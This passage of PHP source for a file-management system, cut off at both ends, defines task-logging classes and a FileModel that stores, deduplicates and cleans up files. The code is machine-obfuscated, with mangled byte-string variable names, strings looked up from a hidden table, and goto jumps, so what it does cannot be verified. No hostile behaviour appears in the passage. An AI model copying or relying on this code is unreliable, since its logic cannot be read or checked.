$½Î¶İÇØ[$±–³Õ’¨[1893]] = $±–³Õ’¨[1334]; } } } $this->update(); } public function curlProgressStart($Äòˆúº¡) { } public function curlProgressEnd($¹î—ùÏÏ) { $¡­á‘ô¬ =& $_SERVER[¬ÏÕ§Áú]; $ğš™ ´¶ =& $this->task; $±õóƒ‘® = curl_getinfo($¹î—ùÏÏ); $¬µƒ± Ó = $±õóƒ‘®[$¡­á‘ô¬[1913]]; if ($¬µƒ± Ó == -1) { $¬µƒ± Ó = $±õóƒ‘®[$¡­á‘ô¬[1914]]; } if ($ğš™ ´¶[$¡­á‘ô¬[1893]] == $¡­á‘ô¬[120] && $¬µƒ± Ó) { $ğš™ ´¶[$¡­á‘ô¬[1894]] += $¬µƒ± Ó; } $this->update(); } } class TaskHttp extends Task { protected function startAfter() { $Ä‹Î‘Ş‘ =& $_SERVER[¬ÏÕ§Áú]; $ã›àæ =& $this->task; $ã›àæ[$Ä‹Î‘Ş‘[1915]] = 1; Hook::bind($Ä‹Î‘Ş‘[1883], array($this, $Ä‹Î‘Ş‘[1916])); Hook::bind($Ä‹Î‘Ş‘[1885], array($this, $Ä‹Î‘Ş‘[1917])); Hook::bind($Ä‹Î‘Ş‘[1887], array($this, $Ä‹Î‘Ş‘[1918])); } protected function endAfter() { $øÒ’Ç–Ì =& $_SERVER[¬ÏÕ§Áú]; Hook::unbind($øÒ’Ç–Ì[1883], array($this, $øÒ’Ç–Ì[1916])); Hook::unbind($øÒ’Ç–Ì[1885], array($this, $øÒ’Ç–Ì[1917])); Hook::unbind($øÒ’Ç–Ì[1887], array($this, $øÒ’Ç–Ì[1918])); } public function progressStart($ô€€Š¶¦) { $ä¢†Ôè» =& $_SERVER[¬ÏÕ§Áú]; $ì£æÙâ¦ = curl_getinfo($ô€€Š¶¦); self::log($ä¢†Ôè»[1919] . $ì£æÙâ¦[$ä¢†Ôè»[393]]); self::valueSet($this->task[$ä¢†Ôè»[492]], $this->task); } public function progressEnd($áº¢¾ÈÊ) { $îÛ­ù¢ë =& $_SERVER[¬ÏÕ§Áú]; self::log($îÛ­ù¢ë[1920] . $this->task[$îÛ­ù¢ë[492]]); $this->end(); } public function progress($­³à§ÒÜ, $«¶¼ğåš, $ïºŠğíú, $Ö¤¸ÛÍù, $ÙçàÆü) { $¡Ë®ü£ı =& $_SERVER[¬ÏÕ§Áú]; $·ÙßÎ€Ã =& $this->task; if ($ÙçàÆü > 0) { $·ÙßÎ€Ã[$¡Ë®ü£ı[1188]] = $·ÙßÎ€Ã[$¡Ë®ü£ı[1188]] == 0 ? $Ö¤¸ÛÍù : $·ÙßÎ€Ã[$¡Ë®ü£ı[1188]]; $·ÙßÎ€Ã[$¡Ë®ü£ı[1838]] = $ÙçàÆü; } else { if ($ïºŠğíú > 0) { $·ÙßÎ€Ã[$¡Ë®ü£ı[1188]] = $·ÙßÎ€Ã[$¡Ë®ü£ı[1188]] == 0 ? $«¶¼ğåš : $·ÙßÎ€Ã[$¡Ë®ü£ı[1188]]; $·ÙßÎ€Ã[$¡Ë®ü£ı[1838]] = $ïºŠğíú; } } $this->update(); self::log("\160\162\x6f\147\162\145\x73\x73\x48\164\164\160\72\x64\157\167\x6e\x3a{$ïºŠğíú}\x2f{$«¶¼ğåš}\73\x20\x75\160\x6c\157\141\x64\72{$ÙçàÆü}\x2f{$Ö¤¸ÛÍù}\x3b"); } } class TaskLog { private $task; private $taskID; private $isEnd = false; static function newTask($â•Ì®½•, $ùÛåÒ¾À = '', $â¶ƒé° = 0, $£¢Ğ†ğü = '') { $ÒÔÍ‚îİ =& $_SERVER[¬ÏÕ§Áú]; $£¢Ğ†ğü = $£¢Ğ†ğü ? $£¢Ğ†ğü : ($ùÛåÒ¾À ? $ùÛåÒ¾À : $â•Ì®½•); $‹á¹²Ô² = new Task($â•Ì®½•, $ùÛåÒ¾À, $â¶ƒé°, $£¢Ğ†ğü); $GLOBALS[$ÒÔÍ‚îİ[1921] . $â•Ì®½•] = new TaskLog($ÒÔÍ‚îİ[1820], $‹á¹²Ô², $£¢Ğ†ğü); return $‹á¹²Ô²; } public function __construct($»éûÂÆº = '', $Ñõ­ÒÚĞ = '', $éÚÙÔ’ø = '') { $øÔîï–ˆ =& $_SERVER[¬ÏÕ§Áú]; if (!$»éûÂÆº) { $»éûÂÆº = $øÔîï–ˆ[1820]; } $‰ÖÖÎ…¼ = $»éûÂÆº . $øÔîï–ˆ[482] . rand_string(10); if (!$éÚÙÔ’ø) { $éÚÙÔ’ø = $»éûÂÆº . $øÔîï–ˆ[53] . $éÚÙÔ’ø; } switch ($»éûÂÆº) { case $øÔîï–ˆ[1820]: if (!$Ñõ­ÒÚĞ || !$Ñõ­ÒÚĞ->task) { return echoLog($»éûÂÆº . $øÔîï–ˆ[1922]); } $â”¾ã£­ = $Ñõ­ÒÚĞ; $‰ÖÖÎ…¼ = $â”¾ã£­->task[$øÔîï–ˆ[492]]; $»éûÂÆº = $â”¾ã£­->task[$øÔîï–ˆ[492]]; if (!$â”¾ã£­->task[$øÔîï–ˆ[1722]]) { $â”¾ã£­->task[$øÔîï–ˆ[1722]] = $éÚÙÔ’ø ? $éÚÙÔ’ø : $»éûÂÆº; } break; case $øÔîï–ˆ[1923]: if (!$Ñõ­ÒÚĞ) { return echoLog($»éûÂÆº . $øÔîï–ˆ[1924]); } $ä´øüœ° = is_string($Ñõ­ÒÚĞ) ? array($Ñõ­ÒÚĞ) : $Ñõ­ÒÚĞ; $â”¾ã£­ = new TaskFileTransfer($‰ÖÖÎ…¼, $»éûÂÆº, 0, $éÚÙÔ’ø ? $éÚÙÔ’ø : $ä´øüœ°[0]); foreach ($ä´øüœ° as $‡“ªÉéŸ) { $â”¾ã£­->addPath($‡“ªÉéŸ); } break; case $øÔîï–ˆ[399]: if (!$Ñõ­ÒÚĞ) { return echoLog($»éûÂÆº . $øÔîï–ˆ[1924]); } $ä´øüœ° = is_string($Ñõ­ÒÚĞ) ? array($Ñõ­ÒÚĞ) : $Ñõ­ÒÚĞ; $â”¾ã£­ = new TaskZip($‰ÖÖÎ…¼, $»éûÂÆº, 0, $éÚÙÔ’ø ? $éÚÙÔ’ø : $ä´øüœ°[0]); foreach ($ä´øüœ° as $‡“ªÉéŸ) { $â”¾ã£­->addPath($‡“ªÉéŸ); } break; case $øÔîï–ˆ[1354]: if (!$Ñõ­ÒÚĞ) { return echoLog($»éûÂÆº . $øÔîï–ˆ[1924]); } $â”¾ã£­ = new TaskUnZip($‰ÖÖÎ…¼, $»éûÂÆº, 0, $éÚÙÔ’ø ? $éÚÙÔ’ø : $Ñõ­ÒÚĞ); if ($Ñõ­ÒÚĞ) { $â”¾ã£­->addFile($Ñõ­ÒÚĞ); } break; case $øÔîï–ˆ[162]: $â”¾ã£­ = new TaskHttp($‰ÖÖÎ…¼, $»éûÂÆº); break; default: return; break; } $this->task = $â”¾ã£­; $this->taskID = $‰ÖÖÎ…¼; Hook::bind($øÔîï–ˆ[1858], array($this, $øÔîï–ˆ[1925])); Hook::bind($øÔîï–ˆ[1860], array($this, $øÔîï–ˆ[1926])); Hook::bind($øÔîï–ˆ[1854], array($this, $øÔîï–ˆ[1927])); echoLog($øÔîï–ˆ[1928] . $â”¾ã£­->task[$øÔîï–ˆ[1722]]); } public function __destruct() { $this->end(); } public function end($ò³àïÒĞ = '') { $–Ã„¢£‚ =& $_SERVER[¬ÏÕ§Áú]; if ($this->isEnd) { return; } if (!$this->task || !$this->taskID) { return; } $this->isEnd = !0; $this->task->end($ò³àïÒĞ); $this->task = !1; $this->taskID = !1; Hook::unbind($–Ã„¢£‚[1858], array($this, $–Ã„¢£‚[1925])); Hook::unbind($–Ã„¢£‚[1860], array($this, $–Ã„¢£‚[1926])); Hook::unbind($–Ã„¢£‚[1854], array($this, $–Ã„¢£‚[1927])); } public function taskUpdate($Ÿöú£ã§) { $ÛŞÕÏï =& $_SERVER[¬ÏÕ§Áú]; if (!$Ÿöú£ã§ || $this->taskID != $Ÿöú£ã§[$ÛŞÕÏï[492]]) { return; } $€†íóÎ = 20; $˜ÓôÜ±¿ = intval($Ÿöú£ã§[$ÛŞÕÏï[1839]] * $€†íóÎ); $Ê¤åş Ú = $ÛŞÕÏï[186] . str_repeat($ÛŞÕÏï[473], $˜ÓôÜ±¿) . $ÛŞÕÏï[1139] . str_repeat($ÛŞÕÏï[53], $€†íóÎ - $˜ÓôÜ±¿) . $ÛŞÕÏï[188]; $î¸¢ƒª = $Ê¤åş Ú . sprintf($ÛŞÕÏï[1929], $Ÿöú£ã§[$ÛŞÕÏï[1839]] * 100) . $ÛŞÕÏï[1930]; $ä‡’ß¢ø = $î¸¢ƒª . $Ÿöú£ã§[$ÛŞÕÏï[1838]] . $ÛŞÕÏï[8] . $Ÿöú£ã§[$ÛŞÕÏï[1188]] . LNG($ÛŞÕÏï[1931]); $ôÖéºñò = $ÛŞÕÏï[12]; if ($Ÿöú£ã§[$ÛŞÕÏï[1915]]) { $ä‡’ß¢ø = $î¸¢ƒª . size_format($Ÿöú£ã§[$ÛŞÕÏï[1838]]) . $ÛŞÕÏï[8] . size_format($Ÿöú£ã§[$ÛŞÕÏï[1188]]); $ôÖéºñò = size_format($Ÿöú£ã§[$ÛŞÕÏï[1840]]) . $ÛŞÕÏï[1932]; } if ($Ÿöú£ã§[$ÛŞÕÏï[1190]]) { $Ÿöú£ã§[$ÛŞÕÏï[1889]] = $Ÿöú£ã§[$ÛŞÕÏï[1190]] . $ÛŞÕÏï[53] . $Ÿöú£ã§[$ÛŞÕÏï[1889]]; } if ($Ÿöú£ã§[$ÛŞÕÏï[1889]]) { $‰ï£Ş„Ù = $ÛŞÕÏï[12]; if ($Ÿöú£ã§[$ÛŞÕÏï[1891]]) { $‰ï£Ş„Ù = $ÛŞÕÏï[50] . size_format($Ÿöú£ã§[$ÛŞÕÏï[1892]]) . $ÛŞÕÏï[8] . size_format($Ÿöú£ã§[$ÛŞÕÏï[1891]]); } $ôÖéºñò .= $Ÿöú£ã§[$ÛŞÕÏï[1889]] . $‰ï£Ş„Ù; } if ($Ÿöú£ã§[$ÛŞÕÏï[877]] && !$Ÿöú£ã§[$ÛŞÕÏï[1891]]) { $ôÖéºñò .= $ÛŞÕÏï[53] . size_format($Ÿöú£ã§[$ÛŞÕÏï[1896]]) . $ÛŞÕÏï[8] . size_format($Ÿöú£ã§[$ÛŞÕÏï[877]]); } echoLog($ä‡’ß¢ø . $ÛŞÕÏï[53] . $ôÖéºñò, !0); } public function taskEnd($èòÜ†») { $„š«ü‰¿ =& $_SERVER[¬ÏÕ§Áú]; if (!$èòÜ†» || $this->taskID != $èòÜ†»[$„š«ü‰¿[492]]) { return; } $ ³Ğõ” = $èòÜ†» ? LNG($„š«ü‰¿[1933]) . $„š«ü‰¿[4] . $èòÜ†»[$„š«ü‰¿[1838]] . $„š«ü‰¿[8] . $èòÜ†»[$„š«ü‰¿[1188]] . LNG($„š«ü‰¿[1931]) . $„š«ü‰¿[84] : $„š«ü‰¿[12]; echoLog($„š«ü‰¿[1934] . $èòÜ†»[$„š«ü‰¿[1722]] . ($èòÜ†»[$„š«ü‰¿[545]] ? $„š«ü‰¿[84] . $èòÜ†»[$„š«ü‰¿[545]] : $„š«ü‰¿[12]) . $„š«ü‰¿[84] . $ ³Ğõ” . $„š«ü‰¿[1935] . sprintf($„š«ü‰¿[976], timeFloat() - $èòÜ†»[$„š«ü‰¿[1841]]) . $„š«ü‰¿[1853]); $this->end(); } public function taskKill($½ê¤ÅŠ—) { $ãõ÷‹ı‡ =& $_SERVER[¬ÏÕ§Áú]; if (!$½ê¤ÅŠ— || $this->taskID != $½ê¤ÅŠ—[$ãõ÷‹ı‡[492]]) { return; } echoLog($ãõ÷‹ı‡[1936] . $½ê¤ÅŠ—[$ãõ÷‹ı‡[1722]]); } } goto AÑÙø³ƒŞ×; e¨ÈÉŒÆöÇ: class FileModel extends ModelBase { protected $tableName = "\x69\x6f\137\x66\x69\154\x65"; protected $tableMeta = array("\x74\141\x62\x6c\x65\x4e\141\155\x65" => "\151\157\x5f\146\x69\x6c\145\x5f\155\x65\164\141", "\155\x65\x74\x61\x46\x69\145\154\x64" => "\146\x69\154\x65\x49\x44"); public function fileInfo($Å…·Ù÷ó) { $„ƒÎˆ Ç =& $_SERVER[¬ÏÕ§Áú]; static $ÜõÇõ¿ = array(); if (!isset($ÜõÇõ¿[$Å…·Ù÷ó])) { $İöƒ–Éç = $„ƒÎˆ Ç[2087]; $÷ì•ˆİ = Model($„ƒÎˆ Ç[565])->field($İöƒ–Éç)->where(array($„ƒÎˆ Ç[563] => $Å…·Ù÷ó))->find(); $ÜõÇõ¿[$Å…·Ù÷ó] = $÷ì•ˆİ; } return $ÜõÇõ¿[$Å…·Ù÷ó]; } public function addFileByContent($°´”Ãº¿ = '', $üÃ Š¥ƒ, $Ò¦ãìÃ = '') { $ê€ñº—Í =& $_SERVER[¬ÏÕ§Áú]; $Éƒõ§è¤ = TEMP_PATH . $ê€ñº—Í[2088]; if (!is_dir($Éƒõ§è¤)) { mk_dir($Éƒõ§è¤); } $ë¯Àì¬ = $Éƒõ§è¤ . $ê€ñº—Í[2089] . rand_string(16); $‡÷¯ êá = file_put_contents($ë¯Àì¬, $°´”Ãº¿); if ($‡÷¯ êá === !1 || strlen($°´”Ãº¿) != $‡÷¯ êá) { return !1; } $É“ĞÏÈì = $this->addFile($ë¯Àì¬, $üÃ Š¥ƒ, $Ò¦ãìÃ, !0); if (file_exists($ë¯Àì¬)) { @unlink($ë¯Àì¬); } return $É“ĞÏÈì; } public function createFileName($Î‡²áêø, $îö°ú­Â, $Í™«¼ã = false, $•Ôç¥„ = false) { $ÆÚŠ¨­ù =& $_SERVER[¬ÏÕ§Áú]; $ìß‚ˆ­¨ = IO::init($ÆÚŠ¨­ù[8]); $­»êÀ¸ = $this->_makeFilePath($Î‡²áêø, $îö°ú­Â, $ìß‚ˆ­¨, $Í™«¼ã, $•Ôç¥„); $ÌĞ¥Ç§ã = $ìß‚ˆ­¨->pathFather($­»êÀ¸); static $µºáãÂ‡ = false; $™œÉæÑæ = $ÆÚŠ¨­ù[2090] . md5($ÌĞ¥Ç§ã); if (!$µºáãÂ‡ && !Cache::get($™œÉæÑæ)) { $µºáãÂ‡ = !0; $ÒçµµÕ• = IO::mkdir($ÌĞ¥Ç§ã); if (!IO::exist($ÒçµµÕ• . $ÆÚŠ¨­ù[915])) { IO::mkfile($ÒçµµÕ• . $ÆÚŠ¨­ù[915]); } Cache::set($™œÉæÑæ, 1, 3600 * 2); } return $­»êÀ¸; } public function _makeFilePath($ùâ°âº, $è»İç©ò, $¯Œ€ÇÜ¿, $¬óà‡ÚÔ = false, $º¿®æ = false) { $Í¦åÍîÏ =& $_SERVER[¬ÏÕ§Áú]; $õ¨ˆïø = Model($Í¦åÍîÏ[886])->get($Í¦åÍîÏ[2091]); $”ÑãÈÜ = $Í¦åÍîÏ[1377] . $è»İç©ò[$Í¦åÍîÏ[492]] . $Í¦åÍîÏ[504] . date($Í¦åÍîÏ[2092]); $šàîÎÏÛ = $”ÑãÈÜ . rand_string(5) . short_id(100); $ùâ°âº = str_replace($Í¦åÍîÏ[8], $Í¦åÍîÏ[11], KodIO::clear($ùâ°âº)); $–”…–¢ç = $¯Œ€ÇÜ¿->ext($ùâ°âº); if (!$ùâ°âº) { $õ¨ˆïø = $Í¦åÍîÏ[892]; } switch ($õ¨ˆïø) { case $Í¦åÍîÏ[2093]: if ($–”…–¢ç) { $šàîÎÏÛ = $šàîÎÏÛ . $Í¦åÍîÏ[10] . $–”…–¢ç; } if ($–”…–¢ç == $Í¦åÍîÏ[2030]) { $šàîÎÏÛ .= $Í¦åÍîÏ[1346]; } break; case $Í¦åÍîÏ[2094]: $Öª®ÇĞÒ = Model($Í¦åÍîÏ[886])->get($Í¦åÍîÏ[887]); $íÆ¾¬›ä = substr(md5($Í¦åÍîÏ[888] . $Öª®ÇĞÒ . date($Í¦åÍîÏ[862])), 0, 8); $”ÑãÈÜ = $Í¦åÍîÏ[1377] . $è»İç©ò[$Í¦åÍîÏ[492]] . $Í¦åÍîÏ[504] . date($Í¦åÍîÏ[2095]) . $íÆ¾¬›ä . $Í¦åÍîÏ[8]; if ($–”…–¢ç == $Í¦åÍîÏ[2030]) { $ùâ°âº .= $Í¦åÍîÏ[1346]; } $ó‹ÖïÅÆ = $Í¦åÍîÏ[2096] . $”ÑãÈÜ . $ùâ°âº; CacheLock::lock($ó‹ÖïÅÆ); $šàîÎÏÛ = $”ÑãÈÜ . $ùâ°âº; if (IO::exist($”ÑãÈÜ . $ùâ°âº)) { $Ÿ…ù½æŠ = substr($ùâ°âº, 0, strlen($ùâ°âº) - strlen($–”…–¢ç)); $óà±¼î = $º¿®æ ? substr($º¿®æ, 0, 5) : ($¬óà‡ÚÔ ? substr($¬óà‡ÚÔ, 0, 5) : rand_string(5)); $óà±¼î .= rand_string(3); $šàîÎÏÛ = $”ÑãÈÜ . $Ÿ…ù½æŠ . $óà±¼î; if ($–”…–¢ç) { $šàîÎÏÛ = $šàîÎÏÛ . $Í¦åÍîÏ[10] . $–”…–¢ç; } } if (IO::isOsDriver($šàîÎÏÛ) && !IO::isUploadServer($šàîÎÏÛ)) { if (IO::exist($šàîÎÏÛ)) { CacheLock::unlock($ó‹ÖïÅÆ); return $šàîÎÏÛ; } $ªû”èí  = IO::setContent($šàîÎÏÛ, $Í¦åÍîÏ[12]); if (!$ªû”èí ) { show_json($Í¦åÍîÏ[2097], !1); } } CacheLock::unlock($ó‹ÖïÅÆ); break; case $Í¦åÍîÏ[892]: break; default: break; } return $šàîÎÏÛ; } public function addFileByRemote($Õù‡ÈÇÎ, $å«·ªÜø, $ Ñ·Å‡ = array()) { $´‰ÏÁªû =& $_SERVER[¬ÏÕ§Áú]; if (!IO::isFile($Õù‡ÈÇÎ)) { return !1; } $òª§ü = $ Ñ·Å‡[$´‰ÏÁªû[568]] ? $ Ñ·Å‡[$´‰ÏÁªû[568]] : $´‰ÏÁªû[12]; $ÊİÄÎÓƒ = IO::hashMd5($Õù‡ÈÇÎ, $òª§ü); $ï¡¡—ö– = KodIO::parse($Õù‡ÈÇÎ); $Úµ§üÁ = array($´‰ÏÁªû[641] => IO::size($Õù‡ÈÇÎ), $´‰ÏÁªû[2098] => 1, $´‰ÏÁªû[514] => $å«·ªÜø, $´‰ÏÁªû[929] => $ï¡¡—ö–[$´‰ÏÁªû[492]], $´‰ÏÁªû[515] => $Õù‡ÈÇÎ, $´‰ÏÁªû[2099] => $ Ñ·Å‡[$´‰ÏÁªû[696]] ? $ Ñ·Å‡[$´‰ÏÁªû[696]] : IO::hashSimple($Õù‡ÈÇÎ), $´‰ÏÁªû[2100] => $ÊİÄÎÓƒ ? $ÊİÄÎÓƒ : $òª§ü); if ($ÂÒ‰ ‘ = $this->addFileCheckExist($Úµ§üÁ[$´‰ÏÁªû[696]], $Úµ§üÁ[$´‰ÏÁªû[568]], $Úµ§üÁ[$´‰ÏÁªû[89]])) { return $ÂÒ‰ ‘; } return $this->addFileData($Úµ§üÁ); } private function addFileData($½÷¢¬ˆ) { $ì¿¿Û Â =& $_SERVER[¬ÏÕ§Áú]; if (!$½÷¢¬ˆ) { return !1; } if (!IO::isFile($½÷¢¬ˆ[$ì¿¿Û Â[97]])) { return !1; } $½÷¢¬ˆ[$ì¿¿Û Â[89]] = intval($½÷¢¬ˆ[$ì¿¿Û Â[89]]); if (!$½÷¢¬ˆ[$ì¿¿Û Â[89]] && strlen($½÷¢¬ˆ[$ì¿¿Û Â[696]]) > 32) { $½÷¢¬ˆ[$ì¿¿Û Â[89]] = intval(substr($½÷¢¬ˆ[$ì¿¿Û Â[696]], 32)); } $Í¸°ŒÁÓ = $this->add($½÷¢¬ˆ); return $this->find($Í¸°ŒÁÓ); } public function addFile($ì£¢¡Œ, $ù·ù²Åô, $ÅíŞ˜±, $Çª’×Ã² = false) { $ÓŸ¶ªÔê =& $_SERVER[¬ÏÕ§Áú]; $ºèôÔª¬ = IO::hashSimple($ì£¢¡Œ); $ùå±Š‹Ñ = IO::size($ì£¢¡Œ); $ôñÈƒ«š = $ùå±Š‹Ñ <= 1024 * 1024 * 10 ? IO::hashMd5($ì£¢¡Œ) : $ÓŸ¶ªÔê[12]; $ßó­„Ø¹ = $ÓŸ¶ªÔê[2101] . $ºèôÔª¬; CacheLock::lock($ßó­„Ø¹); if ($ôñÈƒ«š && $ºèôÔª¬) { $ä³±†Èø = $this->addFileCheckExist($ºèôÔª¬, $ôñÈƒ«š, $ùå±Š‹Ñ); if ($ä³±†Èø) { CacheLock::unlock($ßó­„Ø¹); return $ä³±†Èø; } } $¾®ï¨‚ë = $this->addFileMake($ì£¢¡Œ, $ù·ù²Åô, $ùå±Š‹Ñ, $ºèôÔª¬, $ôñÈƒ«š, $ÅíŞ˜±, $Çª’×Ã²); $·•ö€ı = $this->addFileData($¾®ï¨‚ë); if (!$·•ö€ı) { return !1; } CacheLock::unlock($ßó­„Ø¹); if (!$ôñÈƒ«š && $·•ö€ı) { $this->fileMd5Check($·•ö€ı); } return $·•ö€ı; } public function fileMd5Check($¾ëôŠÂÀ) { $¦ê©¦Š˜ =& $_SERVER[¬ÏÕ§Áú]; $—”ûş„Ä = array($¾ëôŠÂÀ[$¦ê©¦Š˜[562]], $¾ëôŠÂÀ[$¦ê©¦Š˜[97]]); $‘¯š˜»õ = $¦ê©¦Š˜[2102] . $¾ëôŠÂÀ[$¦ê©¦Š˜[97]]; $Âıİ  = $¦ê©¦Š˜[2103] . $¾ëôŠÂÀ[$¦ê©¦Š˜[562]]; TaskQueue::add($¦ê©¦Š˜[2104], $—”ûş„Ä, $‘¯š˜»õ, $Âıİ ); } public function fileMd5Set($è˜˜Êû, $é‰³½¦®) { $é²áåĞİ =& $_SERVER[¬ÏÕ§Áú]; $‹ïî——Û = $this->find($è˜˜Êû); if (!$‹ïî——Û || $‹ïî——Û[$é²áåĞİ[568]]) { return; } $·°£‡å¼ = IO::hashMd5($é‰³½¦®); if (!$·°£‡å¼) { return $é²áåĞİ[12]; } $this->where(array($é²áåĞİ[562] => $è˜˜Êû))->save(array($é²áåĞİ[568] => $·°£‡å¼)); } public function addFileMake($‡„ÊóÂ , $µÔÆ¢°Œ, $Ğ©’ÏóÇ, $ÙÏ¡¬‡—, $²òƒ×ğÉ, $ÂƒÎ÷¨û, $ªş”£É°) { $‰ûîÁÓĞ =& $_SERVER[¬ÏÕ§Áú]; $¿§…ÄÜÒ = $this->createFileName($ÂƒÎ÷¨û, $µÔÆ¢°Œ, $ÙÏ¡¬‡—, $²òƒ×ğÉ); $ıóõ…Õ = get_path_father($¿§…ÄÜÒ); $—ºâ¹Î¨ = get_path_this($¿§…ÄÜÒ); if ($ªş”£É°) { $Ö–äÁíä = IO::move($‡„ÊóÂ , $ıóõ…Õ, !1, $—ºâ¹Î¨); } else { $Ö–äÁíä = IO::copy($‡„ÊóÂ , $ıóõ…Õ, !1, $—ºâ¹Î¨); } if (!$Ö–äÁíä) { return !1; } $’¥¬ˆÆÒ = IO::init($Ö–äÁíä); $’¥¬ˆÆÒ->cacheMethod($‰ûîÁÓĞ[192], $’¥¬ˆÆÒ->path, $‰ûîÁÓĞ[189]); if (IO::size($Ö–äÁíä) != $Ğ©’ÏóÇ) { return !1; } $µ±ã«ó´ = array($‰ûîÁÓĞ[641] => $Ğ©’ÏóÇ, $‰ûîÁÓĞ[2098] => 1, $‰ûîÁÓĞ[514] => $ÂƒÎ÷¨û, $‰ûîÁÓĞ[929] => $µÔÆ¢°Œ[$‰ûîÁÓĞ[492]], $‰ûîÁÓĞ[515] => $¿§…ÄÜÒ, $‰ûîÁÓĞ[2099] => $ÙÏ¡¬‡—, $‰ûîÁÓĞ[2100] => $²òƒ×ğÉ); return $µ±ã«ó´; } public function addFileCheckExist($¼·É»…, $ì©ú½ı, $‰ÇÕÑÒÍ) { $äâè¼ôÊ =& $_SERVER[¬ÏÕ§Áú]; $¼ı¥ÜùØ = $this->findByHash($¼·É»…, $ì©ú½ı); if (!$¼ı¥ÜùØ) { return !1; } $•ÜÈ‘ßš = array($äâè¼ôÊ[2098] => intval($¼ı¥ÜùØ[$äâè¼ôÊ[2105]]) + 1, $äâè¼ôÊ[641] => $‰ÇÕÑÒÍ); $this->where(array($äâè¼ôÊ[563] => $¼ı¥ÜùØ[$äâè¼ôÊ[562]]))->save($•ÜÈ‘ßš); return $¼ı¥ÜùØ; } public function remove($Â…ÇÚøÈ) { $this->linkCountChange($Â…ÇÚøÈ, !1); $this->clearEmpty(); return !0; } public function linkAdd($å³ÉÓ‡) { $this->linkCountChange($å³ÉÓ‡, !0); } public function linkCountChange($´®®æ¿, $ˆ‰›Ôúë) { $ò¦¬Œ¤× =& $_SERVER[¬ÏÕ§Áú]; if (!$´®®æ¿) { return; } if (!is_array($´®®æ¿)) { $´®®æ¿ = array($´®®æ¿); } $Ü¡³í¨ = array(); foreach ($´®®æ¿ as $¸±ò¹­î) { $’§„ÕÓ° = $¸±ò¹­î . $ò¦¬Œ¤×[12]; if (!$Ü¡³í¨[$’§„ÕÓ°]) { $Ü¡³í¨[$’§„ÕÓ°] = 0; } $Ü¡³í¨[$’§„ÕÓ°]++; } $ğ³ƒ±†† = array(); foreach ($Ü¡³í¨ as $¸±ò¹­î => $ëà²Õßô) { $’§„ÕÓ° = $ëà²Õßô . $ò¦¬Œ¤×[12]; if (!$ğ³ƒ±††[$’§„ÕÓ°]) { $ğ³ƒ±††[$’§„ÕÓ°] = array(); } $ğ³ƒ±††[$’§„ÕÓ°][] = $¸±ò¹­î; } foreach ($ğ³ƒ±†† as $ëà²Õßô => $Ö†¾Ù¿) { if (!$Ö†¾Ù¿) { continue; } $ëà²Õßô = $ˆ‰›Ôúë ? $ëà²Õßô : -intval($ëà²Õßô); $çõş·å˜ = array($ò¦¬Œ¤×[562] => array($ò¦¬Œ¤×[7], $Ö†¾Ù¿)); if ($ëà²Õßô < 0) { $çõş·å˜[$ò¦¬Œ¤×[2105]] = array($ò¦¬Œ¤×[1140], abs($ëà²Õßô)); } $this->where($çõş·å˜)->setAdd($ò¦¬Œ¤×[2105], $ëà²Õßô); } } public function findByHash($®¡š¤ë, $Õà¯¶Óİ = false) { $Òê²ë¥ =& $_SERVER[¬ÏÕ§Áú]; if (!$®¡š¤ë && !$Õà¯¶Óİ) { return !1; } $Ñ³Ò«’‚ = array($Òê²ë¥[2099] => $®¡š¤ë); if ($Õà¯¶Óİ) { $Ñ³Ò«’‚ = array($Òê²ë¥[2100] => $Õà¯¶Óİ); } return $this->order($Òê²ë¥[2106])->where($Ñ³Ò«’‚)->find(); } public function clearEmpty($œµŠÑ‹” = 1) { $»‡›À± =& $_SERVER[¬ÏÕ§Áú]; $œÃêØ”ä = time() - 3600 * 24 * $œµŠÑ‹”; $¹Àı­Ï = $»‡›À±[2107] . $œÃêØ”ä; $Ùëê‡†º = $this->where($¹Àı­Ï)->select(); if (!$Ùëê‡†º) { return; } $£Öªø“ = new Task($»‡›À±[2108], $»‡›À±[12], count($Ùëê‡†º)); foreach ($Ùëê‡†º as $±‚¡ÈéŠ) { $£Öªø“->update(1); $this->resetFile($±‚¡ÈéŠ); } $£Öªø“->end(); } public function resetFile($ÓÒ§®èä) { $Ü  äò€ =& $_SERVER[¬ÏÕ§Áú]; $ò‡´¤¡ù = array($Ü  äò€[563] => $ÓÒ§®èä[$Ü  äò€[562]]); $Ïã¿Ãø = Model($Ü  äò€[1483])->where($ò‡´¤¡ù)->count(); $¼Úõùª€ = Model($Ü  äò€[2109])->where($ò‡´¤¡ù)->count(); $Ç÷½Ó°– = intval($Ïã¿Ãø) + intval($¼Úõùª€); if ($Ç÷½Ó°– == 0) { Model($Ü  äò€[2110])->delete($ÓÒ§®èä[$Ü  äò€[562]]); $this->where($ò‡´¤¡ù)->delete(); $this->metaSet($ÓÒ§®èä[$Ü  äò€[562]], null, null); if (!IO::isFile($ÓÒ§®èä[$Ü  äò€[97]])) { write_log(array($Ü  äò€[2111], ACTION, $ÓÒ§®èä), $Ü  äò€[1319]); return !1; } IO::remove($ÓÒ§®èä[$Ü  äò€[97]]); write_log(ACTION . $Ü  äò€[954] . KodUser::id() . $Ü  äò€[2112] . $ÓÒ§®èä[$Ü  äò€[562]] . $Ü  äò€[2113] . $ÓÒ§®èä[$Ü  äò€[89]] . $Ü  äò€[212] . $ÓÒ§®èä[$Ü  äò€[97]], $Ü  äò€[2111]); return; } if ($ÓÒ§®èä[$Ü  äò€[2105]] != $Ç÷½Ó°–) { $this->where($ò‡´¤¡ù)->save(array($Ü  äò€[2098] => $Ç÷½Ó°–)); } } public function storageInfo($‚°œ¬«¶ = false) { $ğÛÀ’Ú =& $_SERVER[¬ÏÕ§Áú]; $Š¹è«™À = $this->count() + 0.0; $ÔËäç‹ = 0; $ÃÕµğ›ô = 1; $ñƒ°¶ÚŠ = 0; $éÏùõ©¥ = 5000; for ($ºŸÈº¨  = 0; $ºŸÈº¨  < $Š¹è«™À; $ºŸÈº¨  = $ºŸÈº¨  + $éÏùõ©¥) { $¾Êüä» = $this->limit($ºŸÈº¨ , $ºŸÈº¨  + $éÏùõ©¥)->select(); foreach ($¾Êüä» as $ÆÊü‰¥) { $ÃÕµğ›ô += $ÆÊü‰¥[$ğÛÀ’Ú[89]] * $ÆÊü‰¥[$ğÛÀ’Ú[2105]]; $ÔËäç‹ += $ÆÊü‰¥[$ğÛÀ’Ú[89]] * ($ÆÊü‰¥[$ğÛÀ’Ú[2105]] - 1); $ñƒ°¶ÚŠ += $ÆÊü‰¥[$ğÛÀ’Ú[2105]]; } } $‹‚ÏáÚ = array($ğÛÀ’Ú[2114] => $ÃÕµğ›ô, 